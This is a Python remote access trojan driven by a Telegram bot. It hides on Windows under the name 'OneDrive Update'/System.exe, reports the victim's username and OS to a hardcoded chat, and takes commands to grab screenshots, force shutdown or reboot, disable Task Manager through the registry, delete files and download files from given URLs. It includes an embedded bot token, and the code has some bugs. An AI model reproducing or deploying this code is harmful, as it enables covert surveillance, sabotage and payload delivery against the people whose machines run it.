import ctypes
import os
import platform
import shutil
import subprocess
import sys
import time
import urllib
from typing import re

import cv2
import mss
import numpy
import telebot

TelegramToken = '1370143332:AAHmykJe-GjIb5K83guWs9PMxFwD0YCX2tM'
TelegramChatID = '397809136'

ustanovka = 'C:\\ProgramData\\'
name = 'OneDrive Update'
PName = 'System.exe'
Directory = 'C:'

bot = telebot.TeleBot(TelegramToken)

# дериктория создается
CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]

RAT = [
    Directory,
    Directory + 'Documents',
    Directory + 'Photos'
]

for Directories in RAT:

    if not os.path.exists(Directories):
        os.makedirs(Directories)
#
# subprocess.call(
#     'schtasks /create /f /sc onlogon /rl highest /tn "' + name + '" /tr "' + ustanovka + PName + '"',
#     shell=True)
# shutil.copy2(CurrentPath, r'' + ustanovka + PName)
ctypes.windll.kernel32.SetFileAttributesW(ustanovka + PName, 2)
System = platform.system()
Release = platform.release()
Version = System + ' ' + Release

bot.send_message(TelegramChatID,
                 '\n*' + '🔘 Online!' + '\n'
                                        '\nPC » ' + os.getlogin() +
                 '\nOS » ' + Version +
                 '\n'

                 )


# Скрин кароч

@bot.message_handler(regexp='/Screen')
def Screen(command):
    try:

        bot.send_chat_action(command.chat.id, 'upload_photo')
        File = Directory + 'Screen.jpg'

        if os.path.exists(File):
            os.remove(File)

        try:
            import mss
        except ImportError:
            raise SystemExit('Please run › pip install mss')

        with mss.mss() as sct:
            sct.shot(output=File)
        Screen = open(File, 'rb')

        bot.send_photo(command.chat.id, Screen)

    except:

        bot.reply_to(command, 'XZ', parse_mode='Markdown')


@bot.message_handler(regexp='/BB')
def bb(command):
    subprocess.call('shutdown -s /t 0 /f', shell=True)


@bot.message_handler(regexp='/Выключить диспетчер задач')
def vikl(command):
    subprocess.call(
        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',
        shell=True)


@bot.message_handler(regexp='/Перезагрузка')
def reb(command):
    os.system("shutdown -t 0 -r -f")


@bot.message_handler(regexp='/Записать экран')
def zap(command):
    LT_time = 0
    first_time = time.time()
    with mss.mss() as sct:
        # Part of the screen to capture
        monitor = {'top': 40, 'left': 0, 'width': 800, 'height': 640}

        while 'Screen capturing':
            LT_time = LT_time + time.time() - first_time

            # Get raw pixels from the screen, save it to a Numpy array
            img = numpy.array(sct.grab(monitor))

            # Display the picture
            cv2.imshow('OpenCV/Numpy normal', img)

            # Display the picture in grayscale
            # cv2.imshow('OpenCV/Numpy grayscale',
            # cv2.cvtColor(img, cv2.COLOR_BGRA2GRAY))

            if cv2.waitKey(25) & 0xFF == ord('q'):
                cv2.destroyAllWindows()
                break


@bot.message_handler(regexp='/Удалить файл')
def delete(command):
    command = command.replace('/delete', '')
    path_file = command.strip()
    try:
        os.remove(path_file)
        response = 'Удалeн'
    except:
        try:
            os.rmdir(path_file)
            response = 'Удален'
        except:
            try:
                shutil.rmtree(path_file)
                response = 'Удален'
            except:
                response = 'Не найдeно такого файла'


@bot.message_handler(regexp='/Загрузить')
def Upload(command):
    try:

        URL = re.split('/загрузить', command.text, flags=re.I)[1]
        bot.send_message(command.chat.id, '_Uploading file..._', parse_mode='Markdown')

        Filename = os.getcwd() + '\\' + os.path.basename(URL)
        r = urllib.request.urlretrieve(URL, Filename)

        bot.reply_to(command, '_File uploaded to computer!_\n\n`' + Filename + '`', parse_mode='Markdown')

    except ValueError:
        bot.reply_to(command, '_Insert a direct download link._', parse_mode='Markdown')

    except:
        bot.send_message(command.chat.id, '_Send file or paste URL_\n\n*› /загрузить*', parse_mode='Markdown')


bot.polling(none_stop=True, interval=0)
